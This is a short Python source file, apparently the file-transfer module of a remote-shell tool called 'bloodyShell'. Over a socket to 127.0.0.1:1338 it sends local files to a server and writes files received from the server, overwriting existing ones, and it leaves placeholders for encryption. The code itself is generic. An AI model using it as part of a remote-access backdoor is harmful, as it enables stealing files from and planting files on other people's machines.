#!/usr/bin/env python

# bloodyShell - transfer
import socket

Files_Conn = ('127.0.0.1', 1338)

# WARNING: upload WILL overwrite files if they already exist.
# Plase check carefully if target filename is already present.
def upload(filename, conn):
    # server -> client
    with open(filename, 'wb') as f:
        s = socket.socket()
        s.connect(Files_Conn)
        
        data = s.recv(4096)
        while data:
            # decrypt here
            f.write(data)
            data = s.recv(4096)

    f.close()
    s.close()
    return 0

def download(filename, conn):
    # client -> server
    with open(filename, 'rb') as f:
        s = socket.socket()
        s.connect(Files_Conn)
        
        data = f.read(4096)
        while data:
            # encrypt here
            s.sendall(data)
            data = f.read(4096)

    f.close()
    s.close()
    return 0
